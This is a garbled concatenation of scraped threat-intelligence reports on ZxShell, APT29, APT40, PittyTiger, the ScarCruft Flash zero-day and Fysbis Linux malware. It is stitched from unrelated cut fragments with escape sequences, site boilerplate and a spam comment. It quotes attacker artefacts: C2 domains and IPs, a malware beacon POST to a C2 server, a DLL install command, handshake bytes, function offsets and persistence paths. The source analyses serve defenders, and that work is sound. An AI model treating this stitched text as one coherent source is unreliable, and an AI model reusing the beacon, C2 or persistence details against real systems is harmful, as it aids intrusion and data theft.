machine.\\nAs our analysis demonstrates, ZxShell is an effective tool that can be ultimately used to steal user credentials and other highly valuable information. The threat posed by ZxShell to organizations is one that cannot be ignored.\\xa0 Organizations with high financial or intellectual property value should take the time to ensure their security requirements are met and that employee’s are educated about the security threats their organizations face.\\nFor additional information, please see our blog post.\\nProtecting Users from These Threats\\nAdvanced Malware Protection (AMP) is ideally suited to detect the sophisticated malware used by this threat actor.\\nCWS or WSA web scanning prevents access to malicious websites, including watering hole attacks, and detects malware used in these attacks.\\nThe Network Security protection of IPS and NGFW have up-to-date signatures to detect malicious network activity by threat actors.\\nESA can block spear phishing emails sent by threat actors as part of their campaign.\\nAppendix A: Snort Rules\\nInitial connection from the infected computer’s perspective – after it connects to the controller –\\nRECV:\\xa0 85190000250400000000404000000000\\nSEND:\\xa0 86190000040100006666464000000000\\nRECV:\\xa0 4edf9340780100000000000000000000\\nSEND:\\xa0 00000000000000000000000000000000\\nThe rules are on the first 8 bytes of the first two packets. They are hard coded in the binaries. The rest of the bytes are variable (for example, 66664640 is a floating point version number of ZxShell).\\nSnort rules:\\nsid:32180\\nsid:32181\\nThese rules have been released in our community ruleset and can be downloaded and used directly, or via pulledpork from Snort.org\\nAppendix B: ClamAV Signatures\\nWin.Trojan.ZxShell-11\\nWin.Trojan.ZxShell-12\\nWin.Trojan.ZxShell-13\\nWin.Trojan.ZxShell-14\\nWin.Trojan.ZxShell-15\\nWin.Trojan.ZxShell-16\\nWin.Trojan.ZxShell-17\\nWin.Trojan.ZxShell-18\\nWin.Trojan.ZxShell-19\\nWin.Trojan.ZxShell-20\\nWin.Trojan.ZxShell-21\\nWin.Trojan.ZxShell-22\\nWin.Trojan.ZxShell-23\\nWin.Trojan.ZxShell-24\\nWin.Trojan.ZxShell-25\\nWin.Trojan.ZxShell-26\\nThese signatures are available within the ClamAV database.\\xa0 Please run freshclam to ensure you stay updated with the latest coverage.\\nAppendix C: List of Memory Offsets for Some ZxShell Functions\\nHere’s a list for some ZxShell functions for sample SHA256: 1eda7e556181e46ba6e36f1a6bfe18ff5566f9d5e51c53b41d08f9459342e26c:\\nFUNCTION NAME\\nBRIEF DESCRIPTION\\nOFFSET\\nZxGetLibAndProcAddr\\nZxShell GetProcAddress implementation\\n0x12CDA\\nCopyMemoryFromNewMsvcrt\\nZxShell memory copy routine\\n0x12C4C\\nServiceExists\\nGet if a service is installed in the system or not\\n0x0A7C7\\nProcessScCommand\\nZxShell “SC” command implementation\\n0x0E3EF\\nAnalyseAndLoadPlugins\\nParse the installed plugin list and load each one of them\\n0x0127B7\\nDeleteAndLogPlugin\\nDelete a corrupted plugin and log the problem\\n0x012597\\nKeyloggerThread\\nZxShell keylogger implementation\\n0x0D591\\nGetIpListAndConnect\\nAnalyse the IP list inside the ZxShell PE and tries to connect\\n0x011496\\nBuildTargetIpListStruct\\nBuild remote server Ip list structure\\n0x11419\\nDoHandshake\\nPerform initial connection handshake\\n0xB8E8\\nGetLocalPcDescrStr\\nBuild a string containing the target workstation data\\n0x0B627\\nMainConnectionIo\\nZxShell main connection I/O routine\\n0x1126C\\nReceiveCommandData\\nReceive each byte from the socket until a newline char\\n0x016DF\\nProcessCommand\\nMain ZxShell command processing routine\\n0x10C2B\\nAppendix D: Other Collateral\\nHere is a non-exhaustive list of ZxShell samples that were analyzed for this report.\\nHere is a list of Domains organized by port.\\nShare\\nShare:\\nTags: APT Group 72 malware Operation SMN security SMN Talos threats\\nCONNECT WITH CISCO\\nLET US HELP\\nCall us: 1.800.553.6387 - Ext 118\\nUS/Can | 5am-5pm Pacific Other Countries\",\n",

But - when an attacker uses PowerShell, WMI, Kerberos attacks, novel persistence mechanisms, seemingly unlimited C2 infrastructure and half-a-dozen rapidly-evolving malware families across a 100k node network to compromise the environment at a rate of 10 systems per day - the cumulative challenges can become overwhelming. This talk will showcase the obstacles overcome during one of the largest and most advanced breaches Mandiant has ever responded to, the novel investigative techniques employed, and the lessons learned that allowed us to help remediate it.\\nDetails a massive intrusion by Russian APT29 (AKA CozyDuke, Cozy Bear)\\n...\\nPublished in:\\nInternet\\n8 Comments\\n19 Likes\\nStatistics\\nNotes\\nFull Name\\nComment goes here.\\n12 hours ago\\nDelete\\nReply\\nBlock\\nAre you sure you want to\\nYes\\nNo\\nYour message goes here\\nPost\\nKeisha Cameron\\nThe \"END OF GOUT\" is a short, to the point guide on how to reverse gout symptoms without ever leaving your home.

The actor has conducted operations since at least 2013 in support of China’s naval modernization effort. The group has specifically targeted engineering, transportation, and the defense industry, especially where these sectors overlap with maritime technologies. More recently, we have also observed specific targeting of countries strategically important to the Belt and Road Initiative including Cambodia, Belgium, Germany, Hong Kong, Philippines, Malaysia, Norway, Saudi Arabia, Switzerland, the United States, and the United Kingdom. This China-nexus cyber espionage group was previously reported as TEMP.Periscope and TEMP.Jumper.\\nMission\\nIn December 2016, China’s People Liberation Army Navy (PLAN) seized a U.S. Navy unmanned underwater vehicle (UUV) operating in the South China Sea. The incident paralleled China’s actions in cyberspace; within a year APT40 was observed masquerading as a UUV manufacturer, and targeting universities engaged in naval research. That incident was one of many carried out to acquire advanced technology to support the development of Chinese naval capabilities. We believe APT40’s emphasis on maritime issues and naval technology ultimately support China’s ambition to establish a blue-water navy.\\nIn addition to its maritime focus, APT40 engages in broader regional targeting against traditional intelligence targets, especially organizations with operations in Southeast Asia or involved in South China Sea disputes. Most recently, this has included victims with connections to elections in Southeast Asia, which is likely driven by events affecting China’s Belt and Road Initiative. China’s “One Belt, One Road” (一带一路) or “Belt and Road Initiative” (BRI) is a $1 trillion USD endeavor to build land and maritime trade routes across Asia, Europe, the Middle East, and Africa to develop a trade network that will project China’s influence across the greater region.\\nFigure 1: Countries and industries targeted. Countries include the United States, United Kingdom, Norway, Germany, Saudi Arabia, Cambodia and Indonesia\\nAttribution\\nWe assess with moderate confidence that APT40 is a state-sponsored Chinese cyber espionage operation. The actor’s targeting is consistent with Chinese state interests and there are multiple technical artifacts indicating the actor is based in China. Analysis of the operational times of the group’s activities indicates that it is probably centered around China Standard Time (UTC +8). In addition, multiple APT40 command and control (C2) domains were initially registered by China based domain resellers and had Whois records with Chinese location information, suggesting a China based infrastructure procurement process.\\nAPT40 has also used multiple Internet Protocol (IP) addresses located in China to conduct its operations. In one instance, a log file recovered from an open indexed server revealed that an IP address (112.66.188.28) located in Hainan, China had been used to administer the command and control node that was communicating with malware on victim machines. All of the logins to this C2 were from computers configured with Chinese language settings.\\nAttack Lifecycle\\nInitial Compromise\\nAPT40 has been observed leveraging a variety of techniques for initial compromise, including web server exploitation, phishing campaigns delivering publicly available and custom backdoors, and strategic web compromises.\\nAPT40 relies heavily on web shells for an initial foothold into an organization. Depending on placement, a web shell can provide continued access to victims' environments, re-infect victim systems, and facilitate lateral movement.\\nThe operation’s spear-phishing emails typically leverage malicious attachments, although Google Drive links have also been observed.\\nAPT40 leverages exploits in their phishing operations, often weaponizing vulnerabilities within days of their disclosure. Observed vulnerabilities include:\\nCVE-2012-0158\\nCVE-2017-0199\\nCVE-2017-8759\\nCVE-2017-11882\\nFigure 2: APT40 attack lifecycle\\nEstablish Foothold\\nAPT40 uses a variety of malware and tools to establish a foothold, many of which are either publicly available or used by other threat groups. In some cases, the group has used executables with code signing certificates to avoid detection.\\nFirst-stage backdoors such as AIRBREAK, FRESHAIR, and BEACON are used before downloading other payloads.\\nPHOTO, BADFLICK, and CHINA CHOPPER are among the most frequently observed backdoors used by APT40.\\nAPT40 will often target VPN and remote desktop credentials to establish a foothold in a targeted environment. This methodology proves to be ideal as once these credentials are obtained, they may not need to rely as heavily on malware to continue the mission.\\nEscalate Privileges\\nAPT40 uses a mix of custom and publicly available credential harvesting tools to escalate privileges and dump password hashes.\\nAPT40 leverages custom credential theft utilities such as HOMEFRY, a password dumper/cracker used alongside the AIRBREAK and BADFLICK backdoors.\\nAdditionally, the Windows Sysinternals ProcDump utility and Windows Credential Editor (WCE) are believed to be used during intrusions as well.\\nInternal Reconnaissance\\nAPT40 uses compromised credentials to log on to other connected systems and conduct reconnaissance. The group also leverages RDP, SSH, legitimate software within the victim environment, an array of native Windows capabilities, publicly available tools, as well as custom scripts to facilitate internal reconnaissance.\\nAPT40 used MURKYSHELL at a compromised victim organization to port scan IP addresses and conduct network enumeration.\\nAPT40 frequently uses native Windows commands, such as net.exe, to conduct internal reconnaissance of a victim’s environment.\\nWeb shells are heavily relied on for nearly all stages of the attack lifecycle. Internal web servers are often not configured with the same security controls as public-facing counterparts, making them more vulnerable to exploitation by APT40 and similarly sophisticated groups.\\nLateral Movement\\nAPT40 uses many methods for lateral movement throughout an environment, including custom scripts, web shells, a variety of tunnelers, as well as Remote Desktop Protocol (RDP). For each new system compromised, the group usually executes malware, performs additional reconnaissance, and steals data.\\nAPT40 also uses native Windows utilities such as at.exe (a task scheduler) and net.exe (a network resources management tool) for lateral movement.\\nPublicly available tunneling tools are leveraged alongside distinct malware unique to the operation.\\nAlthough MURKYTOP is primarily a command-line reconnaissance tool, it can also be used for lateral movement.\\nAPT40 also uses publicly available brute-forcing tools and a custom utility called DISHCLOTH to attack different protocols and services.\\nMaintain Presence\\nAPT40 primarily uses backdoors, including web shells, to maintain presence within a victim environment. These tools enable continued control of key systems in the targeted network.\\nAPT40 strongly favors web shells for maintaining presence, especially publicly available tools.\\nTools used during the Establish Foothold phase also continue to be used in the Maintain Presence phase; this includes AIRBREAK and PHOTO.\\nSome APT40 malware tools can evade typical network detectiona by leveraging legitimate websites, such as GitHub, Google, and Pastebin for initial C2 communications.\\nCommon TCP ports 80 and 443 are used to blend in with routine network traffic.\\nComplete Mission\\nCompleting missions typically involves gathering and transferring information out of the target network, which may involve moving files through multiple systems before reaching the destination. APT40 has been observed consolidating files acquired from victim networks and using the archival tool rar.exe to compress and encrypt the data before exfiltration. We have also observed APT40 develop tools such as PAPERPUSH to aid in the effectiveness of their data targeting and theft.\\nOutlook and Implications\\nDespite increased public attention, APT40 continues to conduct cyber espionage operations following a regular tempo, and we anticipate their operations will continue through at least the near and medium term. Based on APT40’s broadening into election-related targets in 2017, we assess with moderate confidence that the group’s future targeting will affect additional sectors beyond maritime, driven by events such as China’s Belt and Road Initiative. In particular, as individual Belt and Road projects unfold, we are likely to see continued activity by APT40 which extends against the project’s regional opponents.\\nPrevious Post\\nNext Post\\nPromotion\\nSubscribe\\nShare\\nRecent\\nRSS\\nEmail UpdatesInformation and insight on today's advanced threats from FireEye.\\nShare\\nRecent Posts\\n28 Apr 2020Excelerating Analysis, Part 2 — X[LOOKUP] Gon’ Pivot To Ya\\n27 Apr 2020Putting the Model to Work: Enabling Defenders With Vulnerability\\nIntelligence — Intelligence for Vulnerability Management, Part Four\\n22 Apr 2020Vietnamese Threat Actors APT32 Targeting Wuhan Government and Chinese\\nMinistry of Emergency Management in Latest Example of COVID-19 Related Espionage\\nRSS Feed: Stay Connected\\nCompany\\nWhy FireEye?\\nCustomer Stories\\nCareers\\nCertifications and Compliance\\nInvestor Relations\\nSupplier Documents\\nNews and Events\\nNewsroom\\nPress Releases\\nWebinars\\nEvents\\nAwards and Honors\\nEmail Preferences\\nTechnical Support\\nIncident?\\nReport Security Issue\\nContact Support\\nCustomer Portal\\nCommunities\\nDocumentation Portal\\nFireEye Blogs\\nThreat Research\\nFireEye Stories\\nIndustry Perspectives\\nThreat Map\\nView the Latest Threats\\nContact Us\\n+1 877-347-3393\\nStay Connected\\nLinkedIn\\nTwitter\\nFacebook\\nYouTube\\nPodcast\\nCette page est également disponible en français.\\nVersion française\\nDiese Seite ist auch auf Deutsch verfügbar\\nZur deutschen Seite wechseln\\n日本語ページを\\n見る\\n해당 페이지는 한글 버전으로 보실 수 있습니다\\n바로 가기\\nContinue viewing this page in English\\nCopyright\\xa0©\\xa02020\\xa0FireEye, Inc.\\xa0All rights reserved.\\xa0Privacy & Cookies Policy | Privacy Shield | Legal Documentation\\nSite Language\\nEnglish\\nMy preferred language:\\nEnglish (English)\\nFrench (Français)\\nGerman (Deutsch)\\nJapanese (日本語)\\nKorean (한국어)\\nMore languages\",\n",

We have been monitoring the activities of this group and believe they are operating from China.This group leverages social engineering to deliver spearphishing emails, in a variety of languages including English, French and Chinese, and email phishing pages to their targets. The attackers use a variety of different malware and tools to maintain command and control (C2) and move laterally through their targets’ networks.In a recent attack against a French company, the attackers sent simple, straightforward messages in English and French from free email addresses using names of actual employees of the targeted company.We have also observed this group using a Yahoo! email phishing kit, with phishing pages for multiple regions and in multiple languages.The malicious documents exploit vulnerable versions of Microsoft Office. The attackers used two different exploits CVE-2012-0158 and CVE-2014-1761.The documents that exploit CVE-2012-0158 were built using a tool that leaves behind the metadata which indicates that the author is “Tran Duy Linh”. (This builder has been shared across multiple threat groups that are otherwise unconnected).The documents that exploit CVE-2014-1761 contain metadata that matches malicious documents created by both the Jdoc builder and the Metasploit Framework, however, the exact builder tool used by the attackers remains unclear.This threat group uses a first-stage malware known as Backdoor.APT.Pgift \\xa0(aka Troj/ReRol.A), which is dropped via malicious documents and connects back to a C2 server. This malware communicates some information about the compromised computer; however, its primary function is to deliver the second-stage malware to the compromised computer.Backdoor.APT.Pgift BuilderDuring our investigation, we discovered a builder used in conjunction with the Backdoor.APT.Pgift malware. This builder is used to create and test files placed on the C2 server.\\xa0The builder creates three files:25dd831ae7d720998a3e3a8d205ab684\\xa0 dr.asp4b89c31d1d7744bcf5049d582d35e717\\xa0 Install-Dll.bate738286a0031621d50aeb5fc1d95d7a4\\xa0 JHttpSrv.dllThe dr.asp file is placed on a web server, and malware on compromised systems will beacon to it. The file can retrieve the compromised host’s IP address and returns either a 32-bit or 64-bit second-stage executable depending on the compromised host’s environment.The Install-Dll.bat file simply installs JHttpSrv.dll by running the command:regsrv jhttpsrvThe JHttpSrv.dll handles the incoming, encoded data from compromised hosts.This data is written to a text file in a directory named “log” with the following format:IP Address-YYYYMMDD-HHMMSS.[3 digits].txtThis data contains information about the compromised system including:HostnameUsernameSystem Type (32-bin or 64-bit)Operating SystemOrganizationOwnerPorts and ProcessesRunning SoftwareInstalled SoftwareNetwork ConfigurationAlthough this tool has some information-gathering capabilities, it is primarily a “downloader” designed to push second-stage malware to a compromised system.Previous AttacksIt appears the Backdoor.APT.Pgift malware was used in an earlier attack against a target in Taiwan. Although the email date shows September 2010, the actual email appears to have been sent in January 2014. The malicious attachment 中秋節酒品禮薈萃.doc (4c350726bb7773f0ac98bdd665ef93dc) exploits CVE-2012-0158 to drop f3b1a1c18c783c2e949e68f0dd047eae. The network communication is:POST /pgift.asp HTTP/1.1Content-Length: 9637User-Agent: Mozilla/4.0 (compatible;)Host: 113.10.221.196:8080Connection: Keep-AliveCache-Control: no-cacheAlthough the malware is the same, this version uses the filename “pgift.asp” instead of “dr.asp.”We have observed attacks against targets in Taiwan using phishing emails written in Traditional Chinese, and the repeated use of .tw domains as command and control servers may indicate an interest in Taiwan as well.MalwareThe PittyTiger group uses various other malware including:Backdoor.APT.PittyTiger1.3\\xa0(aka CT RAT) – This malware is likely used as a second-stage backdoor. The behavior of this sample is similar to the “old” PittyTiger but is distinct. The attackers labeled it as PittyTiger v. 1.3 and use an interface that displays the system information associated with a compromised computer and provides the attacker with a remote shell. The attackers may be using this as second-stage malware.Backdoor.APT.PittyTiger – This malware is the classic “PittyTiger” malware (PittyTigerV1.0) that was heavily used by this group in 2012-2013. This malware allows the attackers to use a remote shell, upload and download files and capture screenshots.Backdoor.APT.Lurid (aka MM RAT / Troj/Goldsun-B) –\\xa0This malware is a variant of the Enfal/Lurid malware used by a variety of different groups since at least 2006. This variant has the same functionality, but the file names have been changed. We have observed the Enfal/Lurid malware in use since 2011 and in conjunction with Backdoor.APT.Pgift as the payload of a malicious document used in spearphishing attacks. It also appears the attackers use this as second-stage malware.Gh0st variants – A report\\xa0by Cassidian Cyber Security reveals the attackers also use variants of Gh0st RAT, a well-known RAT used by a variety of attackers. These variants are known as Paladin RAT and Leo RAT.PoisonIvy – This group also used the Poison Ivy malware during 2008-2009.\\xa0We analyzed PoisonIvy samples that connect to domain names used by this group. The samples were compiled in 2008 and 2009 (one of the samples with a 2008 compile date was also submitted to Virustotal in 2008, leading us to believe the timestamps have not been altered).The PittyTiger group uses a variety of malware to achieve their objectives. We have not observed these attackers using 0day exploits; rather, they appear to acquire access to builders that are more widely distributed that can be used to create malicious documents.AcknowledgementsWe would like to thank Alex Lanstein, Jen Kolde, Jonathan Wrolstad, Ned Moran and Thoufique Haq.SamplesBackdoor.APT.Pgift5e2360a8c4a0cce1ae22919d8bff49fdf74a7a7f43dfce7ff2851baefe19ef6305de3bfb5da1dcf08f9ca0bd589364bf5e2360a8c4a0cce1ae22919d8bff49fd79e48961d1ee982a466d222671a42ccbbf95e89906b8a17fd611002660ffff32ed35e43142b42b57f518197d930471d95e2360a8c4a0cce1ae22919d8bff49fdBackdoor.APT.PittyTiger1.3f65dc0b3eeb3c393e89ab49a3fac95a8Backdoor.APT.Luridb72cf03822cd03a4923195cb7db9ac41eb658d398ac54236564dd52b23943736728d6d3c98b17de3261eaf76b9c3eb7a735d37a1fde0f8d8924a70e9101c45b19712235ba979ef5a23db3ebdc41d9a02d4be094c7f767fc6d9eda1665d536484Backdoor.APT.PittyTiger1097a30d91b0e8adaec8951fb639ffe01f7796e76427c96d57086fcf797518f70618961c6abf67670658c659a4b3897f370e2ebe5d72678affd39264a0d2fedd55e456339936a56c73a7883ea1ddb67255e456339936a56c73a7883ea1ddb6727fade5e7576cc72559c62660371279e8fa53ca3339bb5619f6e39215a4697b521cea8afd101ab50087122231acf8840726be2cbb00158dfab6c81976d93748e8ce15fa3338b7fe780e85c511d5e49a98a494010a51705f7720d3cd378a31733aPoisonIvyae35a23cb418af084d10820bb0eae1d899a5fd0eba39efc9cba880d9629217e0a2494e1e528c4a973232d027172bee44\\nPrevious Post\\nNext Post\\nPromotion\\nSubscribe\\nShare\\nRecent\\nRSS\\nEmail UpdatesInformation and insight on today's advanced threats from FireEye.\\nShare\\nRecent Posts\\n28 Apr 2020Excelerating Analysis, Part 2 — X[LOOKUP] Gon’ Pivot To Ya\\n27 Apr 2020Putting the Model to Work: Enabling Defenders With Vulnerability\\nIntelligence — Intelligence for Vulnerability Management, Part Four\\n22 Apr 2020Vietnamese Threat Actors APT32 Targeting Wuhan Government and Chinese\\nMinistry of Emergency Management in Latest Example of COVID-19 Related Espionage\\nRSS Feed: Stay Connected\\nCompany\\nWhy FireEye?\\nCustomer Stories\\nCareers\\nCertifications and Compliance\\nInvestor Relations\\nSupplier Documents\\nNews and Events\\nNewsroom\\nPress Releases\\nWebinars\\nEvents\\nAwards and Honors\\nEmail Preferences\\nTechnical Support\\nIncident?\\nReport Security Issue\\nContact Support\\nCustomer Portal\\nCommunities\\nDocumentation Portal\\nFireEye Blogs\\nThreat Research\\nFireEye Stories\\nIndustry Perspectives\\nThreat Map\\nView the Latest Threats\\nContact Us\\n+1 877-347-3393\\nStay Connected\\nLinkedIn\\nTwitter\\nFacebook\\nYouTube\\nPodcast\\nCette page est également disponible en français.\\nVersion française\\nDiese Seite ist auch auf Deutsch verfügbar\\nZur deutschen Seite wechseln\\n日本語ページを\\n見る\\n해당 페이지는 한글 버전으로 보실 수 있습니다\\n바로 가기\\nContinue viewing this page in English\\nCopyright\\xa0©\\xa02020\\xa0FireEye, Inc.\\xa0All rights reserved.\\xa0Privacy & Cookies Policy | Privacy Shield | Legal Documentation\\nSite Language\\nEnglish\\nMy preferred language:\\nEnglish (English)\\nFrench (Français)\\nGerman (Deutsch)\\nJapanese (日本語)\\nKorean (한국어)\\nMore languages\",\n",

Daybreak\\nFlash zero-day exploit deployed by the ScarCruft APT Group\\nBy Costin Raiu, Anton Ivanov\\non June 17, 2016. 6:00 am\\nContents\\nOperation Daybreak general informationVulnerability technical detailsBypassing security solutions through DDEVictims:Conclusions:Indicators of compromise:Malicious IPs and hostnames:MD5s:\\nEarlier this year, we deployed new technologies in Kaspersky Lab products to identify and block zero-day attacks. This technology already proved its effectiveness earlier this year, when it caught an Adobe Flash zero day exploit (CVE-2016-1010). Earlier this month, our technology caught another zero-day Adobe Flash Player exploit deployed in targeted attacks. We believe the attacks are launched by an APT Group we track under the codename “ScarCruft”.\\nScarCruft is a relatively new APT group; victims have been observed in Russia, Nepal, South Korea, China, India, Kuwait and Romania. The group has several ongoing operations, utilizing multiple exploits — two for Adobe Flash and one for Microsoft Internet Explorer.\\nOperation Daybreak appears to have been launched by ScarCruft in March 2016 and employs a previously unknown (0-day) Adobe Flash Player exploit. It is also possible that the group deployed another zero day exploit, CVE-2016-0147, which was patched in April.\\nThis exploit caught by our technologies highlights a few very interesting evasion methods, some of which we haven’t seen before. We describe them below.\\nOperation Daybreak general information\\nOperation Daybreak appears to have been launched by unknown attackers to infect high profile targets through spear-phishing e-mails. To date, we have observed more than two dozen victims for these attacks.\\nAlthough the exact attack vector remains unknown, the targets appear\\xa0to receive a malicious link which points to a hacked website where the exploitation kit is hosted. The hacked web server hosting the exploit kit is associated with the ScarCruft APT and used in another line of attacks. Certain details, such as using the same infrastructure and targeting, make us believe that Operation Daybreak is being done by the ScarCruft APT group.\\nThe ScarCruft APT group is a relatively new player and managed to stay under the radar for some time. In general, their work is very professional and focused. Their tools and techniques are well above the average. Prior to the discovery of Operation Daybreak, we observed the ScarCruft APT launching a series of attacks in Operation Erebus. Operation Erebus leverages another Flash Player exploit (CVE-2016-4117) through the use of watering hole attacks.\\nIn the case of Operation Daybreak, the hacked website hosting the exploit kit performs a couple of browser checks before redirecting the visitor to a server controlled by the attackers hosted in Poland.\\nThe main exploit page script contains a BASE64 decoder, as well as rc4 decryption implemented in JS.\\nThe parameters sent to the “ap.php” script are randomly generated on each hit, so the second stage payload gets encrypted differently each time. This prevents easy detection by MD5 or signatures of the second stage payload.\\nThe exploitation process consists of three Flash objects. The Flash object that triggers the vulnerability in Adobe Flash Player is located in second SWF delivered to the victim.\\nAt the end of the exploitation chain, the server sends a legitimate PDF file to user – “china.pdf”. The “china.pdf” file shown to the victims in the last stage of the attack seems to be written in Korean:\\nDecoy document shown to victims\\nThe document text talks about disagreements between China and “The North” over nuclear programs and demilitarization.\\nVulnerability technical details\\nThe vulnerability (CVE-2016-4171) is located in the code which parses the ExecPolicy metadata information.\\nThis is what the structure looks like:\\nThis structure also contains an array of item_info structures:\\nThe documentation says the following about these structures:\\n“The item_info entry consists of item_count elements that are interpreted as key/value pairs of indices into the string table of the constant pool. If the value of key is zero, this is a keyless entry and only carries a value.”\\nIn the exploit used by the ScarCruft group, we have the following item_info structures:\\nItem_info array in exploit object\\nThe code that triggers the vulnerability parses this structure and, for every key and value members, tries to get the respective string object from string constant pool. The problem relies on the fact that the “.key” and “.value” members are used as indexes without any kind of boundary checks. It is easy to understand that if key or value members are larger than string constant pool array, a memory corruption problem appears. It is also important to mention that this member’s (value, key) are directly read from SWF object, so an attacker can easily use them to implement arbitrary read/write operations.\\nGetting object by index from constant pool without any checks\\nUsing this vulnerability, the exploit implements a series of writes at specified addresses to achieve full remote code execution.\\nBypassing security solutions through DDE\\nThe Operation Daybreak attack employs multiple stages, which are all outstanding in some way. One of them attracted our attention because it implements a bypass for security solutions we have never seen before.\\nIn the first stage of the attack, the decrypted shellcode executed by the exploit downloads and executes a special DLL file. This is internally called “yay_release.dll”:\\nSecond stage DLL internal name and export\\nThe code of this module is loaded directly into the exploited application and has several methods of payload execution. One of method uses a very interesting technique of payload execution which is designed mostly to bypass modern anti-malware products. This uses an interesting bug in the Windows DDE component. It is not a secret that anti-malware systems trigger on special system functions that are called in the context of potential vulnerable applications to make a deeper analysis of API calls such as CreateProcess, WinExec or ShellExecute.\\nFor instance, such defense technologies trigger if a potentially vulnerable application such as Adobe Flash starts other untrusted applications, scripts interpreters or even the command console.\\nTo make execution of payload invisible for these defense systems, the threat actors used the Windows DDE interface in a very clever way.

Windows users should combine traditional anti-malware technologies with patch management, host intrusion detection and, ideally, whitelisting and default-deny strategies. According to a study by the Australian DSD, 85% of the targeted attacks analysed could have been stopped by four simple defense strategies. While it’s impossible to achieve 100% protection, in practice and most cases all you have to do is increase your defenses to the point where it becomes too expensive for the attacker – who will just give up and move on to other targets.\\nKaspersky products detect flash exploit as HEUR:Exploit.SWF.Agent.gen also our AEP (Automatic Exploit Prevention) component can successfully detect this attack.

Their targets have spanned all across the world, with a focus on government, defense organizations and various Eastern European governments. There have been numerous reports on their activities, to the extent that a Wikipedia entry has even been created for them.\\nFrom these reports, we know that the group uses an abundance of tools and tactics, ranging across zero-day exploits targeting common applications such as Java or Microsoft Office, heavy use of spear-phishing attacks, compromising legitimate websites to stage watering-hole attacks, and targeting over a variety of operating systems – Windows, OSX, Linux, even mobile iOS.\\nThe Linux malware Fysbis is a preferred tool of Sofacy, and though it is not particularly sophisticated, Linux security in general is still a maturing area, especially in regards to malware. In short, it is entirely plausible that this tool has contributed to the success of associated attacks by this group. This blog post focuses specifically on this Linux tool preferred by Sofacy and describes considerations and implications when it comes to Linux malware.\\nMalware Assessment\\nFysbis is a modular Linux trojan / backdoor that implements plug-in and controller modules as distinct classes. For reference, some vendors categorize this malware under the Sednit attacker group naming designation. This malware includes both 32-bit and 64-bit versions of Executable and Linking Format (ELF) binaries. Additionally, Fysbis can install itself to a victim system with or without root privileges. This increases the options available to an adversary when it comes to selecting accounts for installation.\\nSummary information for the three binaries we analyzed follows:\\nMD5\\n364ff454dcf00420cff13a57bcb78467\\nSHA-256\\n8bca0031f3b691421cb15f9c6e71ce19335\\n5d2d8cf2b190438b6962761d0c6bb\\nssdeep\\n3072:n+1R4tREtGN4qyGCXdHPYK9l0H786\\nO26BmMAwyWMn/qwwiHNl:n+1R43QcIL\\nXdF0w6IBmMAwwCwwi\\nSize\\n141.2 KB (144560 bytes)\\nType\\nELF 64-bit (stripped)\\nInstall as root\\n/bin/rsyncd\\nRoot install desc\\nsynchronize and backup service\\nInstall as non-root\\n~/.config/dbus-notifier/dbus-inotifier\\nNon-root install desc\\nsystem service d-bus notifier\\nC2\\nazureon-line[.]com (TCP/80)\\nUsage Timeframe\\nLate 2014\\nTable 1: Sample 1 – Late 2014 Sofacy 64-bit Fysbis\\nMD5\\n075b6695ab63f36af65f7ffd45cccd39\\nSHA-256\\n02c7cf55fd5c5809ce2dce56085ba43795f2\\n480423a4256537bfdfda0df85592\\nssdeep\\n3072:9ZAxHANuat3WWFY9nqjwbuZf454U\\nNqRpROIDLHaSeWb3LGmPTrIW33HxIajF:\\n9ZAxHANJAvbuZf454UN+rv eQLZPTrV3Z\\nSize\\n175.9 KB (180148 bytes)\\nType\\nELF 32-bit (stripped)\\nInstall as root\\n/bin/ksysdefd\\nRoot install desc\\nsystem kernel service defender\\nInstall as non-root\\n~/.config/ksysdef/ksysdefd\\nNon-root install desc\\nsystem kernel service defender\\nC2\\n198.105.125[.]74 (TCP/80)\\nUsage Timeframe\\nEarly 2015\\nTable 2: Sample 2 – Early 2015 Sofacy 32-bit Fysbis\\nMD5\\ne107c5c84ded6cd9391aede7f04d64c8\\nSHA-256\\nfd8b2ea9a2e8a67e4cb3904b49c789d57ed\\n9b1ce5bebfe54fe3d98214d6a0f61\\nssdeep\\n6144:W/D5tpLWtr91gmaVy+mdckn6BCUd\\nc4mLc2B9:4D5Lqgkcj+\\nSize\\n314.4 KB (321902 bytes)\\nType\\nELF 64-bit (not stripped)\\nInstall as root\\n/bin/ksysdefd\\nRoot install desc\\nsystem kernel service defender\\nInstall as non-root\\n~/.config/ksysdef/ksysdefd\\nNon-root install desc\\nsystem kernel service defender\\nC2\\nmozilla-plugins[.]com (TCP/80)\\nUsage Timeframe\\nLate 2015\\nTable 3: Sample 3 – Late 2015 Sofacy 64-bit Fysbis\\nOverall, these binaries are assessed as low sophistication, but effective. They epitomize the grudging reality that Advanced Persistent Threat (APT) actors often don’t require advanced means to affect their objectives. Rather, these actors more often than not hold their advanced malware and zero day exploits in reserve and employ just enough resources to meet their goals. It is only fair that defenders use any shortcuts or tricks at their disposal to shorten the amount of time it takes to assess threats. In other words, defenders should always look for ways to work smarter before they have to work harder.\\nGetting the Most Out of Strings\\nBinary strings alone revealed a good amount about these files, increasing the efficacy of activities such as static analysis categorization (e.g., Yara). One example of this is Fysbis installation and platform targeting information for the samples in Table 1 and Table 2.\\nFigure 1: Sofacy Fysbis installation and platform targeting found in strings\\nIn this case, we can see the binary installation path and local reconnaissance to determine which flavor of Linux the malware is running. This is followed by a number of Linux shell command style commands related to the malware establishing persistence.\\nAnother example of easily obtained information from these samples is capability based.\\nFigure 2: Sofacy Fysbis capability related leakage through strings\\nFigure 2 shows interactive status / feedback strings that can give a defender an initial profile of capabilities. In addition to contributing to static analysis detections, this can be useful as a starting point for further incident response prioritization and qualification of the threat.\\nSymbolic Information Can Shorten Analysis Time\\nInterestingly, the most recent ELF 64-bit binary we analyzed (Table 3) was not stripped prior to delivery, which offered additional context in the form of symbolic information. Defenders more familiar with Windows Portable Executable (PE) binaries can equate this with compilation of a Debug version versus a Release version. For comparison, if we were to inspect Fysbis “RemoteShell” associated strings in one of the stripped variants, we would only see the following:\\nFigure 3: Sofacy Fysbis stripped binary string references to RemoteShell capability\\nCompare this with what is available from the non-stripped variant:\\nFigure 4: Sofacy Fysbis non-stripped binary strings referenes to RemoteShell capability\\nLittle static analysis gifts like these can help to speed defender enumeration of capabilities and – more importantly – further contribute to correlation and detection across related samples.\\nAdditionally, this latest sample demonstrated minor evolution of the threat, most notably in terms of obfuscation. Specifically, both samples in Table 1 and Table 2 leaked installation information in the clear within binary strings. This was not the case with the sample in Table 3. Taking a closer look at this non-stripped binary using a disassembler, the following corresponds to decoding malware installation information for a root-privilege account.\\nFigure 5: Assembly code view of Sample 3 installation decoding\\nIn this case, the symbolic information hints at the method used for decoding, 